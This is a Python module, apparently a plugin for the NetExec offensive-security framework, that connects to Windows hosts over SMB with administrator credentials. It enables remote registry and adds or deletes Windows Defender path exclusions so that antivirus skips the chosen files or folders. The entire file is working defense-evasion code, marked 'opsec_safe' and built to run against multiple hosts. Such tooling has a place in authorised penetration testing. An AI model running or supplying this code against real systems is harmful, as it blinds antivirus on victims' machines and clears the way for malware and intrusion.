from impacket.dcerpc.v5 import rrp
from impacket.dcerpc.v5.rrp import DCERPCSessionError
from impacket.examples.secretsdump import RemoteOperations
from impacket.system_errors import ERROR_FILE_NOT_FOUND


class NXCModule:
    """Manage Windows Defender path exclusions.

    Specify the ``PATH`` option with a file or directory to add or remove it
    from ``Exclusions\\Paths``. Use ``ACTION`` to choose ``add`` (default) or
    ``delete``.
    """

    name = "defender_add_exclusion"
    description = "Add or remove a Windows Defender exclusion path"
    supported_protocols = ["smb"]
    opsec_safe = True
    multiple_hosts = True

    def __init__(self, context=None, module_options=None):
        self.path = None
        self.action = "add"

    def options(self, context, module_options):
        """PATH Path to exclude, ACTION add/delete"""
        if "PATH" not in module_options:
            context.log.fail("PATH option not specified!")
            return
        self.path = module_options["PATH"]
        if "ACTION" in module_options:
            self.action = module_options["ACTION"].lower()
        if self.action not in ["add", "delete"]:
            context.log.fail("ACTION must be 'add' or 'delete'")
            self.path = None

    def on_admin_login(self, context, connection):
        if not self.path:
            return
        try:
            remote_ops = RemoteOperations(connection.conn, connection.kerberos)
            remote_ops.enableRegistry()
            if not remote_ops._RemoteOperations__rrp:
                context.log.fail("Unable to access remote registry")
                return
            reg_handle = rrp.hOpenLocalMachine(remote_ops._RemoteOperations__rrp)["phKey"]
            key_path = "SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths"
            key_handle = rrp.hBaseRegOpenKey(remote_ops._RemoteOperations__rrp, reg_handle, key_path)["phkResult"]
            value_name = self.path + "\x00"
            if self.action == "add":
                rrp.hBaseRegSetValue(remote_ops._RemoteOperations__rrp, key_handle, value_name, rrp.REG_DWORD, 0)
                context.log.success(f"Added defender exclusion: {self.path}")
            else:
                try:
                    rrp.hBaseRegDeleteValue(remote_ops._RemoteOperations__rrp, key_handle, value_name)
                    context.log.success(f"Deleted defender exclusion: {self.path}")
                except DCERPCSessionError as e:
                    if e.error_code == ERROR_FILE_NOT_FOUND:
                        context.log.fail(f"Exclusion not found: {self.path}")
                    else:
                        context.log.fail(f"Failed deleting exclusion {self.path}: {e}")
        except DCERPCSessionError as e:
            context.log.fail(f"Remote registry error {e}")
        finally:
            if 'remote_ops' in locals():
                remote_ops.finish()
